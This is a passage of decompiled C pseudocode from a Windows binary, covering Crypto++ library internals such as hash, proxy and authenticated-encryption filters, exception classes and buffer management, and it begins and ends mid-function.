    sub_435E90(v8, 0);
    *v9 = &CryptoPP::OutputProxy::`vftable';
    v9[1] = &CryptoPP::OutputProxy::`vftable';
    v9[3] = this;
    *((_BYTE *)v9 + 16) = 0;
  }
  else
  {
    v9 = 0;
  }
  sub_435E90(this + 30, 0);
  this[33] = 0;
  this[34] = 0;
  this[35] = 0;
  this[36] = &CryptoPP::FilterPutSpaceHelper::`vftable';
  this[38] = -1;
  this[39] = 0;
  this[40] = 0;
  this[36] = &CryptoPP::HashFilter::`vftable';
  this[41] = a2 + 4;
  this[30] = &CryptoPP::HashFilter::`vftable';
  this[31] = &CryptoPP::HashFilter::`vftable';
  *((_BYTE *)this + 168) = a4;
  this[43] = 0;
  this[44] = 0;
  sub_419BE0(this + 45, dword_4EEDD8);
  sub_419BE0(this + 51, a6);
  v10 = a5;
  if ( a5 < 0 )
    v10 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)this[41] + 32))(this[41]);
  this[43] = v10;
  v11 = (void (__thiscall ***)(_DWORD, int))this[33];
  if ( v11 )
    (**v11)(v11, 1);
  result = this;
  this[33] = v9;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8DD0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 4B8DD8: using guessed type void *CryptoPP::HashFilter::`vftable';
// 4B8E9C: using guessed type void *CryptoPP::HashFilter::`vftable';
// 4B8EAC: using guessed type void *CryptoPP::HashFilter::`vftable';
// 4BB73C: using guessed type void *off_4BB73C;
// 4BB834: using guessed type int (__stdcall *off_4BB834)(char);
// 4BB844: using guessed type void *off_4BB844;
// 4BB84C: using guessed type void *CryptoPP::OutputProxy::`vftable';
// 4BB904: using guessed type void *CryptoPP::OutputProxy::`vftable';
// 4EEDD8: using guessed type int dword_4EEDD8[4];

//----- (004526B0) --------------------------------------------------------
char *__thiscall sub_4526B0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BB4B4: using guessed type void *CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';

//----- (00452740) --------------------------------------------------------
char *__thiscall sub_452740(char *this, size_t *a2)
{
  size_t *v3; // edi
  unsigned int v4; // eax
  unsigned int v5; // edx
  void *v6; // ecx
  void *v8[5]; // [esp+18h] [ebp-28h] BYREF
  unsigned int v9; // [esp+2Ch] [ebp-14h]
  int v10; // [esp+3Ch] [ebp-4h]

  v3 = a2;
  v4 = a2[4] + 54;
  v10 = 0;
  v8[4] = 0;
  v9 = 15;
  LOBYTE(v8[0]) = 0;
  sub_4196B0(v8, v4);
  if ( a2[5] >= 0x10 )
    v3 = (size_t *)*a2;
  sub_41F120((char *)v8, v3, a2[4]);
  sub_41F120((char *)v8, ": Nonblocking input is not implemented by this object.", 0x36u);
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v10) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 0;
  sub_419BE0((_DWORD *)this + 4, v8);
  v5 = v9;
  *(_DWORD *)this = &CryptoPP::NotImplemented::`vftable';
  if ( v5 >= 0x10 )
  {
    v6 = v8[0];
    if ( v5 + 1 >= 0x1000 )
    {
      v6 = (void *)*((_DWORD *)v8[0] - 1);
      if ( (unsigned int)(v8[0] - v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v6);
  }
  *(_DWORD *)this = &CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8928: using guessed type void *CryptoPP::NotImplemented::`vftable';
// 4BB4B4: using guessed type void *CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';

//----- (00452860) --------------------------------------------------------
_DWORD *__thiscall sub_452860(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  sub_435E90(this, 0);
  this[3] = a2;
  result = this;
  this[4] = 0;
  this[5] = 0;
  return result;
}

//----- (00452890) --------------------------------------------------------
_DWORD *__thiscall sub_452890(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  sub_435E90(this, 0);
  this[3] = a2;
  this[4] = 0;
  this[5] = 0;
  *this = &CryptoPP::FilterWithBufferedInput::`vftable';
  this[1] = &CryptoPP::FilterWithBufferedInput::`vftable';
  result = this;
  this[6] = -1;
  this[7] = 0;
  this[8] = -1;
  *((_BYTE *)this + 36) = 0;
  this[11] = -1;
  this[12] = 0;
  this[13] = 0;
  return result;
}
// 4BB524: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';
// 4BB61C: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';

//----- (00452930) --------------------------------------------------------
_DWORD *__thiscall sub_452930(_DWORD *this, int a2, int a3, char a4, int a5, _DWORD *a6, _DWORD *a7)
{
  int v8; // eax
  void (__thiscall ***v9)(_DWORD, int); // ecx

  sub_435E90(this, 0);
  this[3] = 0;
  this[4] = 0;
  this[5] = 0;
  this[6] = &CryptoPP::FilterPutSpaceHelper::`vftable';
  this[8] = -1;
  this[9] = 0;
  this[10] = 0;
  this[6] = &CryptoPP::HashFilter::`vftable';
  this[11] = a2;
  *this = &CryptoPP::HashFilter::`vftable';
  this[1] = &CryptoPP::HashFilter::`vftable';
  *((_BYTE *)this + 48) = a4;
  this[13] = 0;
  this[14] = 0;
  sub_419BE0(this + 15, a6);
  sub_419BE0(this + 21, a7);
  v8 = a5;
  if ( a5 < 0 )
    v8 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)this[11] + 32))(this[11]);
  this[13] = v8;
  v9 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v9 )
    (**v9)(v9, 1);
  this[3] = a3;
  return this;
}
// 4B8DD0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 4B8DD8: using guessed type void *CryptoPP::HashFilter::`vftable';
// 4B8E9C: using guessed type void *CryptoPP::HashFilter::`vftable';
// 4B8EAC: using guessed type void *CryptoPP::HashFilter::`vftable';

//----- (00452A40) --------------------------------------------------------
char *__thiscall sub_452A40(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::BufferedTransformation::InvalidChannelName::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BB4C0: using guessed type void *CryptoPP::BufferedTransformation::InvalidChannelName::`vftable';

//----- (00452AD0) --------------------------------------------------------
char *__thiscall sub_452AD0(char *this, size_t *a2, size_t *a3)
{
  size_t *v4; // esi
  unsigned int v5; // eax
  size_t *v6; // ecx
  void **v7; // eax
  void **v8; // eax
  unsigned int v9; // edx
  void *v10; // ecx
  void *v11; // ecx
  void *v12; // ecx
  __int128 v14; // [esp+1Ch] [ebp-58h] BYREF
  __int64 v15; // [esp+2Ch] [ebp-48h]
  void *v16[5]; // [esp+34h] [ebp-40h] BYREF
  unsigned int v17; // [esp+48h] [ebp-2Ch]
  __int128 v18; // [esp+4Ch] [ebp-28h] BYREF
  __int64 v19; // [esp+5Ch] [ebp-18h]
  int v20; // [esp+70h] [ebp-4h]

  v4 = a2;
  v20 = 0;
  v5 = a2[4] + 27;
  v16[4] = 0;
  v17 = 15;
  LOBYTE(v16[0]) = 0;
  sub_4196B0(v16, v5);
  if ( a2[5] >= 0x10 )
    v4 = (size_t *)*a2;
  sub_41F120((char *)v16, v4, a2[4]);
  sub_41F120((char *)v16, ": unexpected channel name \"", 0x1Bu);
  v6 = a3;
  if ( a3[5] >= 0x10 )
    v6 = (size_t *)*a3;
  v7 = sub_41F120((char *)v16, v6, a3[4]);
  v19 = 0i64;
  v18 = *(_OWORD *)v7;
  v19 = *((_QWORD *)v7 + 2);
  v7[4] = 0;
  v7[5] = (void *)15;
  *(_BYTE *)v7 = 0;
  LOBYTE(v20) = 1;
  v8 = sub_41F120((char *)&v18, "\"", 1u);
  v14 = *(_OWORD *)v8;
  v15 = *((_QWORD *)v8 + 2);
  v8[4] = 0;
  v8[5] = (void *)15;
  *(_BYTE *)v8 = 0;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v20) = 3;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 1;
  sub_419BE0((_DWORD *)this + 4, &v14);
  v9 = HIDWORD(v15);
  *(_DWORD *)this = &CryptoPP::InvalidArgument::`vftable';
  if ( v9 >= 0x10 )
  {
    v10 = (void *)v14;
    if ( v9 + 1 >= 0x1000 )
    {
      v10 = *(void **)(v14 - 4);
      if ( (unsigned int)(v14 - (_DWORD)v10 - 4) > 0x1F )
        goto LABEL_18;
    }
    sub_46C87D(v10);
  }
  if ( HIDWORD(v19) >= 0x10 )
  {
    v11 = (void *)v18;
    if ( (unsigned int)(HIDWORD(v19) + 1) >= 0x1000 )
    {
      v11 = *(void **)(v18 - 4);
      if ( (unsigned int)(v18 - (_DWORD)v11 - 4) > 0x1F )
        goto LABEL_18;
    }
    sub_46C87D(v11);
  }
  v19 = 0xF00000000i64;
  LOBYTE(v18) = 0;
  if ( v17 >= 0x10 )
  {
    v12 = v16[0];
    if ( v17 + 1 < 0x1000 || (v12 = (void *)*((_DWORD *)v16[0] - 1), (unsigned int)(v16[0] - v12 - 4) <= 0x1F) )
    {
      sub_46C87D(v12);
      goto LABEL_17;
    }
LABEL_18:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_17:
  *(_DWORD *)this = &CryptoPP::BufferedTransformation::InvalidChannelName::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B891C: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 4BB4C0: using guessed type void *CryptoPP::BufferedTransformation::InvalidChannelName::`vftable';

//----- (00452D00) --------------------------------------------------------
_DWORD *__thiscall sub_452D00(_DWORD *this, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // edi
  int v9; // ecx
  char pExceptionObject[40]; // [esp+14h] [ebp-50h] BYREF
  _DWORD v12[6]; // [esp+3Ch] [ebp-28h] BYREF
  int v13; // [esp+60h] [ebp-4h]

  sub_435E90(this, 0);
  this[3] = a5;
  this[4] = 0;
  this[5] = 0;
  this[6] = a3;
  *this = &CryptoPP::FilterWithBufferedInput::`vftable';
  this[1] = &CryptoPP::FilterWithBufferedInput::`vftable';
  this[7] = 1;
  this[8] = a4;
  *((_BYTE *)this + 36) = 0;
  v13 = 0;
  this[11] = -1;
  this[12] = 0;
  this[13] = 0;
  v6 = this[6];
  LOBYTE(v13) = 2;
  if ( v6 == -1 || !this[7] || this[8] == -1 )
  {
    sub_419B80((int)v12, "FilterWithBufferedInput: invalid buffer size");
    LOBYTE(v13) = 3;
    sub_405230(pExceptionObject, v12);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_454E50(this + 10, 1, v6);
  *this = &CryptoPP::ProxyFilter::`vftable';
  this[1] = &CryptoPP::ProxyFilter::`vftable';
  v13 = 4;
  this[18] = a2;
  LOBYTE(v13) = 5;
  if ( a2 )
  {
    v7 = operator new(0x14u);
    v8 = v7;
    LOBYTE(v13) = 6;
    if ( v7 )
    {
      sub_435E90(v7, 0);
      *v8 = &CryptoPP::OutputProxy::`vftable';
      v8[1] = &CryptoPP::OutputProxy::`vftable';
      v8[3] = this;
      *((_BYTE *)v8 + 16) = 0;
    }
    else
    {
      v8 = 0;
    }
    v9 = this[18];
    LOBYTE(v13) = 5;
    (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v9 + 176))(v9, v8);
  }
  return this;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BB524: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';
// 4BB61C: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';
// 4BB84C: using guessed type void *CryptoPP::OutputProxy::`vftable';
// 4BB904: using guessed type void *CryptoPP::OutputProxy::`vftable';
// 4BB914: using guessed type void *CryptoPP::ProxyFilter::`vftable';
// 4BBA0C: using guessed type void *CryptoPP::ProxyFilter::`vftable';
// 452D00: using guessed type _DWORD var_28[6];

//----- (00452E80) --------------------------------------------------------
int __thiscall sub_452E80(int this, int a2, int a3, int a4, char a5)
{
  int v6; // eax
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  char v10; // al
  unsigned int v11; // ecx
  bool v12; // al
  unsigned int v13; // ecx
  bool v14; // cf
  int *v15; // eax
  _DWORD *v16; // eax
  unsigned int v18; // [esp+10h] [ebp-54h] BYREF
  char pExceptionObject[40]; // [esp+14h] [ebp-50h] BYREF
  _DWORD v20[3]; // [esp+3Ch] [ebp-28h] BYREF
  int v21; // [esp+48h] [ebp-1Ch] BYREF
  void (__thiscall ***v22)(_DWORD, int); // [esp+4Ch] [ebp-18h]
  int v23; // [esp+60h] [ebp-4h]

  sub_452890((_DWORD *)this, a3);
  v23 = 0;
  v18 = this + 72;
  *(_DWORD *)(this + 72) = &CryptoPP::FilterPutSpaceHelper::`vftable';
  *(_DWORD *)(this + 80) = -1;
  *(_DWORD *)(this + 84) = 0;
  *(_DWORD *)(this + 88) = 0;
  LOBYTE(v23) = 2;
  *(_DWORD *)this = &off_4BB62C;
  *(_DWORD *)(this + 4) = &off_4BB724;
  *(_DWORD *)(this + 72) = &off_4BB734;
  *(_DWORD *)(this + 96) = a2;
  *(_DWORD *)(this + 100) = 5;
  if ( __RTDynamicCast(
         a2,
         0,
         &CryptoPP::StreamTransformation `RTTI Type Descriptor',
         &CryptoPP::AuthenticatedSymmetricCipher `RTTI Type Descriptor',
         0)
    && !a5 )
  {
    sub_419B80(
      (int)v20,
      "StreamTransformationFilter: please use AuthenticatedEncryptionFilter and AuthenticatedDecryptionFilter for Authent"
      "icatedSymmetricCipher");
    LOBYTE(v23) = 3;
    sub_405230(pExceptionObject, v20);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v6 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 96) + 16))(*(_DWORD *)(this + 96));
  v7 = *(_DWORD *)(this + 96);
  *(_DWORD *)(this + 104) = v6;
  v8 = (*(int (__thiscall **)(int))(*(_DWORD *)v7 + 20))(v7);
  v9 = *(_DWORD *)(this + 96);
  *(_DWORD *)(this + 108) = v8;
  v10 = (*(int (__thiscall **)(int))(*(_DWORD *)v9 + 44))(v9);
  v11 = *(_DWORD *)(this + 104);
  v12 = v10 && v11 > 1;
  *(_BYTE *)(this + 116) = v12;
  v13 = 2 * v11;
  v14 = v13 < *(_DWORD *)(this + 108);
  v15 = (int *)&v18;
  v18 = v13;
  if ( v14 )
    v15 = (int *)(this + 108);
  *(_DWORD *)(this + 112) = *v15;
  v16 = sub_452400(&v21, (int)"BlockPaddingScheme", &a4, 1);
  LOBYTE(v23) = 4;
  sub_453D10((int *)this, (int)v16);
  LOBYTE(v23) = 5;
  if ( v22 )
    (**v22)(v22, 1);
  return this;
}
// 484C5C: using guessed type _DWORD __cdecl __RTDynamicCast(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4B8DD0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 4BB62C: using guessed type void *off_4BB62C;
// 4BB724: using guessed type void *off_4BB724;
// 4BB734: using guessed type void *off_4BB734;
// 452E80: using guessed type _DWORD var_28[3];

//----- (00453000) --------------------------------------------------------
void __thiscall sub_453000(char *this)
{
  unsigned int v2; // ecx
  void *v3; // edx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  void *v5; // [esp-4h] [ebp-1Ch]

  *(_DWORD *)this = &off_4BB62C;
  *((_DWORD *)this + 1) = &off_4BB724;
  *((_DWORD *)this + 18) = &CryptoPP::FilterPutSpaceHelper::`vftable';
  v5 = (void *)*((_DWORD *)this + 22);
  memset(v5, 0, *(_DWORD *)&this[(*((_DWORD *)this + 20) < *((_DWORD *)this + 21) ? 8 : 12) + 72]);
  j_j___free_base(v5);
  *(_DWORD *)this = &CryptoPP::FilterWithBufferedInput::`vftable';
  *((_DWORD *)this + 1) = &CryptoPP::FilterWithBufferedInput::`vftable';
  v2 = *((_DWORD *)this + 12);
  v3 = (void *)*((_DWORD *)this + 13);
  if ( *((_DWORD *)this + 11) < v2 )
    v2 = *((_DWORD *)this + 11);
  memset(*((void **)this + 13), 0, v2);
  j_j___free_base(v3);
  v4 = (void (__thiscall ***)(_DWORD, int))*((_DWORD *)this + 3);
  if ( v4 )
    (**v4)(v4, 1);
}
// 4B8DD0: using guessed type void *CryptoPP::FilterPutSpaceHelper::`vftable';
// 4BB524: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';
// 4BB61C: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';
// 4BB62C: using guessed type void *off_4BB62C;
// 4BB724: using guessed type void *off_4BB724;

//----- (004530B3) --------------------------------------------------------
char *__thiscall sub_4530B3(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  *(_DWORD *)v2 = &off_4BB73C;
  *this = &off_4BB834;
  this[17] = &off_4BB844;
  sub_4348F0(this + 29);
  sub_453000(v2);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}
// 4BB73C: using guessed type void *off_4BB73C;
// 4BB834: using guessed type int (__stdcall *off_4BB834)(char);
// 4BB844: using guessed type void *off_4BB844;

//----- (00453130) --------------------------------------------------------
_DWORD *__thiscall sub_453130(_DWORD *this, char a2)
{
  *this = &CryptoPP::OutputProxy::`vftable';
  this[1] = &CryptoPP::OutputProxy::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BB84C: using guessed type void *CryptoPP::OutputProxy::`vftable';
// 4BB904: using guessed type void *CryptoPP::OutputProxy::`vftable';

//----- (00453180) --------------------------------------------------------
int __thiscall sub_453180(_DWORD **this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(*this[24] + 8))(this[24], a2);
  return a2;
}

//----- (004531A0) --------------------------------------------------------
char __thiscall sub_4531A0(unsigned int *this, void *a2, int a3, unsigned int *a4)
{
  unsigned int v5; // eax

  if ( __std_type_info_compare(&dword_4EAA14, &dword_4EE1D8) || (LOBYTE(v5) = sub_43EE60(a3, a4, this + 4), !(_BYTE)v5) )
  {
    sub_4059C0(a2, (int)&enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme `RTTI Type Descriptor', a3);
    v5 = this[4];
    *a4 = v5;
  }
  return v5;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4EAA14: using guessed type int dword_4EAA14;
// 4EE1D8: using guessed type int dword_4EE1D8;

//----- (00453200) --------------------------------------------------------
int __thiscall sub_453200(_DWORD *this)
{
  int result; // eax
  int v3; // eax
  void (__thiscall ***v4)(_DWORD, int); // ecx
  int v5; // edi

  result = this[3];
  if ( !result )
  {
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 180))(this);
    v4 = (void (__thiscall ***)(_DWORD, int))this[3];
    v5 = v3;
    if ( v4 )
      (**v4)(v4, 1);
    this[3] = v5;
    return v5;
  }
  return result;
}

//----- (00453230) --------------------------------------------------------
int __thiscall sub_453230(_DWORD *this, size_t *a2, _DWORD *a3)
{
  char pExceptionObject[40]; // [esp+10h] [ebp-50h] BYREF
  size_t v6[10]; // [esp+38h] [ebp-28h] BYREF

  if ( a2[4] )
  {
    if ( !sub_452370(a2, dword_4EEDD8) )
    {
      sub_419B80((int)v6, "AuthenticatedEncryptionFilter");
      v6[9] = 0;
      sub_452AD0(pExceptionObject, v6, a2);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUInvalidChannelName_BufferedTransformation_CryptoPP__);
    }
    return (*(int (__thiscall **)(_DWORD *, _DWORD *))(this[30] + 16))(this + 30, a3);
  }
  else
  {
    *a3 = 0;
    return 0;
  }
}
// 4EEDD8: using guessed type int dword_4EEDD8[4];

//----- (004532E0) --------------------------------------------------------
int __thiscall sub_4532E0(_DWORD **this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(*this[3] + 168))(this[3]);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 136))(v1);
}

//----- (00453300) --------------------------------------------------------
char __thiscall sub_453300(int this, int a2, int a3, int a4, int a5)
{
  int v5; // eax

  if ( !*(_BYTE *)(this + 16) )
    return 0;
  v5 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 168))(*(_DWORD *)(this + 12));
  return (*(int (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v5 + 148))(v5, a2, a3, a4, a5);
}

//----- (00453330) --------------------------------------------------------
char __thiscall sub_453330(int this, int a2, int a3, int a4)
{
  int v4; // eax

  if ( !*(_BYTE *)(this + 16) )
    return 0;
  v4 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 168))(*(_DWORD *)(this + 12));
  return (*(int (__thiscall **)(int, int, int, int))(*(_DWORD *)v4 + 152))(v4, a2, a3, a4);
}

//----- (00453360) --------------------------------------------------------
int __thiscall sub_453360(int *this, size_t *a2, char *a3, int a4, int a5, int a6)
{
  char pExceptionObject[40]; // [esp+10h] [ebp-50h] BYREF
  size_t v9[10]; // [esp+38h] [ebp-28h] BYREF

  if ( !a2[4] )
    return sub_454A10(this, a3, a4, a5, a6, 0);
  if ( !sub_452370(a2, dword_4EEDD8) )
  {
    sub_419B80((int)v9, "AuthenticatedEncryptionFilter");
    v9[9] = 0;
    sub_452AD0(pExceptionObject, v9, a2);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUInvalidChannelName_BufferedTransformation_CryptoPP__);
  }
  return (*(int (__thiscall **)(int *, char *, int, _DWORD, int))(this[30] + 24))(this + 30, a3, a4, 0, a6);
}
// 4EEDD8: using guessed type int dword_4EEDD8[4];

//----- (00453420) --------------------------------------------------------
int __thiscall sub_453420(int this, int a2, int a3, int a4, int a5, int a6)
{
  int v7; // eax
  int v8; // ecx

  v7 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 168))(*(_DWORD *)(this + 12));
  v8 = 0;
  if ( *(_BYTE *)(this + 16) )
    v8 = a5;
  return (*(int (__thiscall **)(int, int, int, int, int, int))(*(_DWORD *)v7 + 140))(v7, a2, a3, a4, v8, a6);
}

//----- (00453460) --------------------------------------------------------
int __thiscall sub_453460(int this, int a2, int a3, int a4, int a5, int a6)
{
  int v7; // eax
  int v8; // ecx

  v7 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 168))(*(_DWORD *)(this + 12));
  v8 = 0;
  if ( *(_BYTE *)(this + 16) )
    v8 = a5;
  return (*(int (__thiscall **)(int, int, int, int, int, int))(*(_DWORD *)v7 + 144))(v7, a2, a3, a4, v8, a6);
}

//----- (004534A0) --------------------------------------------------------
int __thiscall sub_4534A0(void *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v7; // eax

  v7 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
  return (*(int (__thiscall **)(int, int, int, int, int, int, int))(*(_DWORD *)v7 + 132))(v7, a2, a3, a4, a5, a6, a7);
}

//----- (004534D0) --------------------------------------------------------
int __thiscall sub_4534D0(_DWORD *this, int a2, _QWORD *a3, __int64 a4, int a5, int a6)
{
  unsigned int v7; // edx
  unsigned int v8; // ecx
  unsigned int v9; // eax
  unsigned int v10; // edx
  int v11; // esi
  unsigned __int64 v12; // kr08_8
  unsigned int v13; // ecx
  int v14; // ecx

  v7 = this[7];
  v8 = this[6];
  v9 = (*a3 + (unsigned __int64)v7) >> 32;
  v10 = *(_DWORD *)a3 + v7;
  if ( __PAIR64__(v9, v10) >= v8 )
    v10 = v8;
  v12 = a4 - *a3;
  v11 = v12;
  v13 = v8 - v10;
  if ( v12 >= v13 )
    v11 = v13;
  v14 = (*(int (__thiscall **)(int, int, unsigned int, int, _DWORD, int))(*(_DWORD *)a2 + 140))(
          a2,
          a5,
          v10 + this[5],
          v11,
          0,
          a6);
  if ( !v14 )
    *a3 += v11;
  return v14;
}

//----- (00453540) --------------------------------------------------------
int __thiscall sub_453540(_DWORD *this, _DWORD *a2)
{
  unsigned int v2; // edx

  v2 = this[4];
  if ( (unsigned __int64)v2 <= *((_QWORD *)this + 3) )
    *a2 = 0;
  else
    *a2 = v2 - this[6];
  return this[6] + this[3];
}

//----- (00453590) --------------------------------------------------------
int __thiscall sub_453590(_DWORD **this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(*this[3] + 168))(this[3]);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 16))(v1);
}

//----- (004535B0) --------------------------------------------------------
int __thiscall sub_4535B0(_DWORD *this, int a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  int result; // eax

  v3 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v3 )
    (**v3)(v3, 1);
  result = a2;
  this[3] = a2;
  return result;
}

//----- (004535D0) --------------------------------------------------------
int __thiscall sub_4535D0(int *this, int a2)
{
  int *v2; // edi
  unsigned int v3; // ecx
  unsigned int v4; // esi
  int *v5; // eax
  int result; // eax
  unsigned int v7; // [esp+8h] [ebp-4h] BYREF

  v2 = this + 27;
  v3 = this[27];
  if ( !v3 || ((v3 - 1) & v3) != 0 )
    v4 = 4096 - 0x1000 % v3;
  else
    v4 = 4096 - ((unsigned __int16)(v3 - 1) & (unsigned __int16)-(v3 > 1) & 0x1000);
  v7 = v4;
  v5 = (int *)&v7;
  if ( v3 >= v4 )
    v5 = v2;
  result = *v5;
  *v2 = result;
  return result;
}

//----- (00453620) --------------------------------------------------------
char __thiscall sub_453620(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  char result; // al
  int v7; // eax
  int v8; // ecx

  v5 = this[5];
  if ( v5 )
  {
    if ( v5 != 1 )
      return 0;
  }
  else if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int, int))(*this + 36))(this, a2, a4) )
  {
    return 1;
  }
  if ( a3
    && (v7 = (*(int (__thiscall **)(_DWORD *))(*this + 168))(this),
        (*(unsigned __int8 (__thiscall **)(int, int *, int, int, int))(*(_DWORD *)v7 + 148))(
          v7,
          &dword_4EEDC0,
          a2,
          a3 - 1,
          a4)) )
  {
    result = 1;
    v8 = 1;
  }
  else
  {
    result = 0;
    v8 = 0;
  }
  this[5] = v8;
  if ( result )
    return 1;
  return result;
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (004536A0) --------------------------------------------------------
char __thiscall sub_4536A0(int this, int a2, int a3, int a4)
{
  int v4; // eax

  if ( !*(_BYTE *)(this + 16) )
    return 0;
  v4 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 168))(*(_DWORD *)(this + 12));
  return (*(int (__thiscall **)(int, int, int, int))(*(_DWORD *)v4 + 48))(v4, a2, a3, a4);
}

//----- (004536C0) --------------------------------------------------------
void __thiscall sub_4536C0(unsigned int *this)
{
  unsigned int v2; // eax
  unsigned int *v3; // ebx
  unsigned int v4; // edi
  unsigned int v5; // ebx
  unsigned int v6; // ebp
  unsigned int v7; // edx
  unsigned int v8; // edx
  unsigned int v9; // ebp
  unsigned int *v10; // ecx
  bool v11; // zf
  unsigned int v12; // [esp+4h] [ebp-4h] BYREF

  if ( *((_BYTE *)this + 36) )
  {
    v2 = this[7];
    v3 = this + 16;
    v4 = this[16];
    if ( v2 <= 1 )
    {
      if ( v4 )
      {
        v8 = this[16];
        do
        {
          v9 = this[17];
          v10 = &v12;
          v12 = this[13] - v9 + this[12];
          if ( v8 < v12 )
            v10 = this + 16;
          if ( *v10 < v4 )
            v4 = *v10;
          v11 = *v3 == v4;
          *v3 -= v4;
          this[17] = v4 + v9;
          if ( v11 || v4 + v9 == this[12] + this[13] )
            this[17] = this[13];
          (*(void (__thiscall **)(unsigned int *, unsigned int, unsigned int))(*this + 228))(this, v9, v4);
          v8 = *v3;
          v4 = *v3;
        }
        while ( *v3 );
      }
    }
    else if ( v4 >= v2 )
    {
      do
      {
        v5 = this[14];
        if ( v4 < v5 )
        {
          v6 = 0;
        }
        else
        {
          v6 = this[17];
          v7 = v5 + v6;
          if ( v5 + v6 == this[13] + this[12] )
            v7 = this[13];
          this[17] = v7;
          this[16] = v4 - v5;
        }
        (*(void (__thiscall **)(unsigned int *, unsigned int, unsigned int))(*this + 228))(this, v6, this[7]);
        v4 = this[16];
      }
      while ( v4 >= this[7] );
    }
  }
}

//----- (00453790) --------------------------------------------------------
int __thiscall sub_453790(_DWORD *this)
{
  unsigned int v1; // ebx
  unsigned int v2; // ebp
  int result; // eax
  int v4; // esi

